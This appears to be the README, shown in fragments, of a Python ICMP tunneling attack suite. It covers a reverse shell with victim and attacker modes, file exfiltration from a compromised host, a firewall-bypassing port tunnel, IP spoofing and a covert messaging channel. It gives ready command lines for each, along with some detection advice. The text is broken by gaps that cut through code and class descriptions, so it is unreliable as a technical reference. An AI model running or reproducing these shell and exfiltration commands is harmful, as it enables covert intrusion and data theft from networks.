# Python ICMP Tunneling Network Attacks Tool
...
class ICMPShell:
    ...
    Inspired by icmpsh and icmpdoor tools 
    """
...
class ICMPExfiltration:
    ...
    Uses ICMP payload to exfiltrate files/data stealthily 
    """
...
## Overview
This is a comprehensive ICMP tunneling tool suite that demonstrates various techniques for creating covert communication channels using the ICMP protocol. It includes modules for reverse shells, data exfiltration, port forwarding, and encrypted covert messaging. These techniques are often used by attackers to bypass firewalls that allow ICMP traffic .

## Key Features

1. **ICMP Reverse Shell** (`shell` module):
   - Full interactive shell over ICMP packets
   - Command execution on target machine
   - File upload/download capabilities
   - Optional AES encryption
   - Based on tools like icmpsh and icmpdoor 

2. **Data Exfiltration** (`exfil` module):
   - File transfer through ICMP payloads
   - Automatic chunking and reassembly
   - Progress tracking
   - Based on exfiltration techniques 

3. **Port Forwarding Tunnel** (`tunnel` module):
   - Forward TCP traffic through ICMP
   - Create SOCKS-like proxy over ICMP
   - Bypass firewall restrictions

4. **Covert Channel** (`breach` module):
...
### Class: `ICMPShell`
Implements reverse shell over ICMP:

- **`server_mode()`**: Victim mode - waits for commands 
- **`client_mode()`**: Attacker mode - sends commands 
- **`execute_command()`**: Runs system commands
- **`encrypt_data()` / `decrypt_data()`**: AES encryption wrapper
- **`upload_file()` / `download_file()`**: File transfer utilities

### Class: `ICMPExfiltration`
Handles data exfiltration:

- **`exfiltrate_file()`**: Splits and sends file via ICMP 
- **`start_listener()`**: Captures and reassembles files
- **`assemble_file()`**: Reconstructs file from chunks

### Class: `ICMPTunnel`
Creates bidirectional tunnel:

- **`server_mode()`**: Receives tunneled traffic, forwards to local service
- **`client_mode()`**: Accepts local connections, tunnels via ICMP
- **`handle_client()`**: Manages client connections

### Class: `ICMPBreach`
Advanced covert channel:

- **`send_covert_message()`**: Encrypts and sends hidden messages 
- **`listen_covert()`**: Detects and decrypts covert messages
...
pip install colorama tqdm pycryptodome

# On Debian/Ubuntu
sudo apt install python3-scapy python3-colorama python3-tqdm python3-pycryptodome
```

### Root Privileges
```bash
# Script requires root for raw packet injection
sudo python3 icmp_tunnel.py [options]
```
...
ICMP Header (8 bytes):
  ...
  - Code: 0
  - Checksum: 16-bit
  - ID: Identifier (often process ID)
  - Sequence: Sequence number

ICMP Payload (variable):
  - Data field (traditionally padding)
  - Can store arbitrary data 
```

### Why ICMP Tunneling Works
- Many firewalls allow ICMP for diagnostics (ping)
- ICMP traffic is often not deeply inspected 
- Payload data is frequently ignored by security tools
- Can encapsulate any protocol inside ICMP 
...
# With encryption
sudo python3 icmp_tunnel.py shell --mode client --target 192.168.1.100 --encrypt --key "mysecret"

# With source IP spoofing
sudo python3 icmp_tunnel.py shell --mode client --target 192.168.1.100 --source 10.0.0.50
```

### File Exfiltration
```bash
# Send file (from compromised machine)
sudo python3 icmp_tunnel.py exfil --mode send --target 192.168.1.100 --file secret.txt

# Listen and capture (attacker machine)
sudo python3 icmp_tunnel.py exfil --mode listen --listener 192.168.1.100 --output ./captured

# With custom packet size
sudo python3 icmp_tunnel.py exfil --mode send --target 192.168.1.100 --file large.bin --packet-size 1400
```

### Port Forwarding Tunnel
```bash
# Server (receives tunneled traffic)
sudo python3 icmp_tunnel.py tunnel --mode server --server 192.168.1.100 --port 8080

# Client (forwards local traffic)
sudo python3 icmp_tunnel.py tunnel --mode client --server 192.168.1.100 --port 8080
...
sudo python3 icmp_tunnel.py breach --mode send --target 192.168.1.100 --message "Top Secret Data"

# Listen for messages
sudo python3 icmp_tunnel.py breach --mode listen --target 192.168.1.100 --key "shared_secret"
```
...
```
Normal ICMP Ping:
| IP Header | ICMP Header | Padding (timestamp data) |

Tunneled Data:
| IP Header | ICMP Header | Encrypted Command Output |
                         | File Chunk                |
                         | Tunneled TCP Segment      |
```

### Communication Flow
1. Attacker sends ICMP Echo Request with payload
2. Victim receives request, extracts payload
3. Victim executes command (or processes data)
4. Victim sends ICMP Echo Reply with response
5. Attacker extracts response from reply
...
2. **Network Disruption**: Excessive ICMP traffic may:
   - Trigger intrusion detection systems
   - Cause network congestion
   - Alert security teams

3. **Detection**: Modern security tools can detect:
   - Unusual ICMP payload sizes
   - Non-standard payload patterns
   - High frequency of ICMP packets
   - ICMP packets with data when pings shouldn't have data 
...
1. **Deep Packet Inspection**:
   ```bash
   # Sniff for unusual ICMP payloads
   tcpdump -i eth0 'icmp[icmptype]=8' -X
   ```
...
3. **Block All ICMP** (if not needed):
   ```bash
...
4. **Monitor for Anomalies**:
   ...
   - High frequency of ICMP
   - ICMP to/from unexpected hosts
   - Sequential ICMP packets with data 

### Signs of ICMP Tunneling:
- ICMP packets larger than standard ( > 64 bytes)
- Constant stream of ICMP packets
- ICMP packets with printable characters in payload
- ICMP traffic when no ping commands are running
...
| No response from target | Check firewall, ensure ICMP allowed |
| Commands failing | Target may have execution restrictions |
| Encryption errors | Install pycryptodome: `pip install pycryptodome` |
| Packet size too large | Reduce packet size (MTU issues) |
| Target unreachable | Check network connectivity |

## Limitations

- Requires ICMP traffic to be allowed
- Slow compared to direct TCP (limited by packet rate)
- Can be detected by deep packet inspection
- Packet loss can corrupt data
- Large files require many packets

## Educational Use

This tool is excellent for learning about:
- Covert channels and data exfiltration
- Protocol abuse and tunneling techniques
- Firewall bypass methods
- Encrypted communication over simple protocols
- Network security monitoring and detection

This tool provides a comprehensive platform for understanding ICMP tunneling vulnerabilities while emphasizing responsible use in controlled, authorized environments.
